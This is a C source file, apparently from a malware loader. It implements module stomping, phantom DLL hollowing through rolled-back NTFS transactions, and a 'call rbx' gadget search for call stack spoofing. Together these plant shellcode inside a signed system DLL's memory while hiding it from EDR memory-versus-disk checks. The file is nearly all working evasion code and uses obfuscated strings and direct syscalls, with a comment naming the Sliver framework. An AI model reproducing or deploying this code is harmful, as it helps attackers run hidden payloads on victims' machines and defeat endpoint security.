// =============================================
// Stomper.c - Module Stomping, Phantom DLL Hollowing,
//             Call Gadget Discovery,
//             Sliding Execution Window
// =============================================

#include "Common.h"

// -----------------------------------------------
// FindCallGadget - scan a module's executable
// sections for a 'call rbx' (FF D3) gadget.
//
// Used by call stack spoofing to inject a frame
// from a legitimate signed DLL into the call stack.
// -----------------------------------------------
PVOID FindCallGadget(IN PVOID pModuleBase) {

    if (!pModuleBase)
        return NULL;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (!(pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
            continue;

        PBYTE pStart = (PBYTE)pModuleBase + pSec[i].VirtualAddress;
        DWORD dwSize = pSec[i].Misc.VirtualSize;

        for (DWORD j = 0; j + 1 < dwSize; j++) {
            // FF D3 = call rbx
            if (pStart[j] == 0xFF && pStart[j + 1] == 0xD3) {
                return (PVOID)(pStart + j);
            }
        }
    }

    return NULL;
}

// -----------------------------------------------
// Module Stomping
// Loads a sacrificial DLL and overwrites its
// executable section with shellcode, so the
// shellcode memory is attributed to a signed DLL.
//
// Memory protection is controlled by SHELLCODE_EXEC_PROT:
//   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
//   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
// -----------------------------------------------
BOOL ModuleStomp(
    IN  PAPI_HASHING pApi,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    // Load sacrificial DLL (deobfuscated)
    BYTE xDll[] = XSTR_STOMP_DLL;
    DEOBF(xDll);
    HMODULE hModule = pApi->pLoadLibraryA((LPCSTR)xDll);
    if (!hModule) {
        LOG("[!] Module stomp: LoadLibrary failed");
        return FALSE;
    }
    LOG("[+] Module stomp: sacrificial DLL loaded");

    // Parse PE headers to find executable section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID  pTextBase = NULL;
    DWORD  dwTextSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (PVOID)((PBYTE)hModule + pSection[i].VirtualAddress);
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pTextBase || dwTextSize < dwShellcodeSize) {
        LOG("[!] Module stomp: .text section too small or not found");
        return FALSE;
    }

    // Change protection to RW for writing
    DWORD dwOldProtect = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, PAGE_READWRITE, &dwOldProtect)) {
        LOG("[!] Module stomp: VirtualProtect(RW) failed");
        return FALSE;
    }

    // Overwrite .text with shellcode
    MemCopy(pTextBase, pShellcode, dwShellcodeSize);

    // Set final execution protection (RX or RWX depending on build config)
    DWORD dwDummy = 0;
    if (!pApi->pVirtualProtect(pTextBase, (SIZE_T)dwShellcodeSize, SHELLCODE_EXEC_PROT, &dwDummy)) {
        LOG("[!] Module stomp: VirtualProtect(exec) failed");
        return FALSE;
    }

    *ppExecAddr = pTextBase;
    LOG("[+] Module stomp: shellcode planted in DLL .text section");
    return TRUE;
}

// -----------------------------------------------
// Phantom DLL Hollowing (NTFS Transactions)
//
// Creates a transacted copy of a sacrificial DLL,
// overwrites the .text section with shellcode in
// the transaction, creates an image section from
// the modified file, then rolls back the transaction.
//
// The section retains the modified content but the
// on-disk file is unchanged. EDR that compares
// memory to the backing file sees no mismatch
// because the section's FILE_OBJECT has the
// transacted (modified) data.
//
// Requires write access to the DLL file path.
// Falls back gracefully if permissions are insufficient.
// -----------------------------------------------
BOOL PhantomDllHollow(
    IN  PAPI_HASHING pApi,
    IN  PNTAPI_FUNC  pNtApis,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    if (!pApi || !pNtApis || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        return FALSE;

    NTSTATUS STATUS = 0;

    // --- Build full DLL path: C:\Windows\System32\<dll> ---

    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
    DEOBF(xPrefix);
    BYTE xDll[] = XSTR_STOMP_DLL;
    DEOBF(xDll);

    CHAR szPath[260];
    MemSet(szPath, 0, sizeof(szPath));
    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);
    SIZE_T nDll = StrLenA((LPCSTR)xDll);
    MemCopy(szPath, xPrefix, nPre);
    MemCopy(szPath + nPre, xDll, nDll);

    // --- Resolve kernel32 base for file I/O APIs ---

    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32)
        return FALSE;

    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
    DEOBF(xCreateFileTx);
    fnCreateFileTransactedA pCreateFileTx =
        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);
    if (!pCreateFileTx)
        return FALSE;

    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
    fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
    if (!pReadFile || !pWriteFile || !pSetFilePointer)
        return FALSE;

    // --- Load ktmw32.dll and resolve TxF APIs ---

    BYTE xKtm[] = XSTR_KTMW32_DLL;
    DEOBF(xKtm);
    HMODULE hKtm = pApi->pLoadLibraryA((LPCSTR)xKtm);
    if (!hKtm)
        return FALSE;

    BYTE xCreateTx[] = XSTR_CREATE_TRANSACTION;
    DEOBF(xCreateTx);
    fnCreateTransaction pCreateTx =
        (fnCreateTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xCreateTx);
    if (!pCreateTx)
        return FALSE;

    BYTE xRollback[] = XSTR_ROLLBACK_TRANSACTION;
    DEOBF(xRollback);
    fnRollbackTransaction pRollback =
        (fnRollbackTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xRollback);
    if (!pRollback)
        return FALSE;

    // --- Create transaction ---

    HANDLE hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTx == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateTransaction failed");
        return FALSE;
    }

    // --- Open DLL file within the transaction (read + write) ---

    HANDLE hFile = pCreateFileTx(
        szPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTx,
        NULL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateFileTransacted failed (permissions?)");
        pRollback(hTx);
        return FALSE;
    }

    LOG("[+] Phantom: transacted file opened");

    // --- Read PE headers from the transacted file ---
    // We need to find the .text section's PointerToRawData and VirtualAddress

    BYTE peHeader[1024];
    DWORD dwBytesRead = 0;
    if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL) || dwBytesRead < sizeof(IMAGE_DOS_HEADER)) {
        pRollback(hTx);
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peHeader;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        pRollback(hTx);
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peHeader + pDos->e_lfanew);
    if ((PBYTE)pNt + sizeof(IMAGE_NT_HEADERS) > peHeader + dwBytesRead) {
        pRollback(hTx);
        return FALSE;
    }
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        pRollback(hTx);
        return FALSE;
    }

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD dwTextRawOffset = 0;
    DWORD dwTextRawSize   = 0;
    DWORD dwTextVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwTextRawOffset = pSec[i].PointerToRawData;
            dwTextRawSize   = pSec[i].SizeOfRawData;
            dwTextVA        = pSec[i].VirtualAddress;
            break;
        }
    }

    if (dwTextRawSize < dwShellcodeSize) {
        LOG("[!] Phantom: .text too small for shellcode");
        pRollback(hTx);
        return FALSE;
    }

    // --- Seek to .text section's raw data offset ---

    pSetFilePointer(hFile, (LONG)dwTextRawOffset, NULL, 0 /*FILE_BEGIN*/);

    // --- Write shellcode at .text offset in transacted file ---

    DWORD dwWritten = 0;
    if (!pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL) || dwWritten != dwShellcodeSize) {
        LOG("[!] Phantom: WriteFile failed");
        pRollback(hTx);
        return FALSE;
    }

    LOG("[+] Phantom: shellcode written to transacted .text");

    // --- Create image section from the transacted file ---
    // The section sees the modified content (with our shellcode)

    HANDLE hSection = NULL;
    SET_SYSCALL(pNtApis->NtCreateSection);
    STATUS = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x000F001F,     // SECTION_ALL_ACCESS
        (ULONG_PTR)0,              // NULL ObjectAttributes
        (ULONG_PTR)0,              // NULL MaximumSize (file-backed)
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)0x01000000,     // SEC_IMAGE
        (ULONG_PTR)hFile,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtCreateSection failed", STATUS);
        pRollback(hTx);
        return FALSE;
    }

    // --- Rollback transaction: on-disk file is unchanged ---
    // The section retains the modified content

    pRollback(hTx);
    LOG("[+] Phantom: transaction rolled back (file clean)");

    // --- Map the section into our process ---

    PVOID  pBase    = NULL;
    SIZE_T viewSize = 0;
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    STATUS = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,     // Current process
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,              // ZeroBits
        (ULONG_PTR)0,              // CommitSize
        (ULONG_PTR)0,              // SectionOffset = NULL
        (ULONG_PTR)&viewSize,
        (ULONG_PTR)1,              // ViewShare
        (ULONG_PTR)0,              // AllocationType
        (ULONG_PTR)PAGE_READONLY,
        0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtMapViewOfSection failed", STATUS);
        return FALSE;
    }

    // --- Change .text protection to executable ---
    // SEC_IMAGE maps with PE section header protections (typically RX).
    // SHELLCODE_EXEC_PROT selects RX or RWX based on build config.

    PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
    SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
    ULONG  dwOldProt  = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtProtectVirtualMemory failed", STATUS);
        return FALSE;
    }

    *ppExecAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    LOG("[+] Phantom DLL hollowing: shellcode mapped via transacted section");
    return TRUE;
}

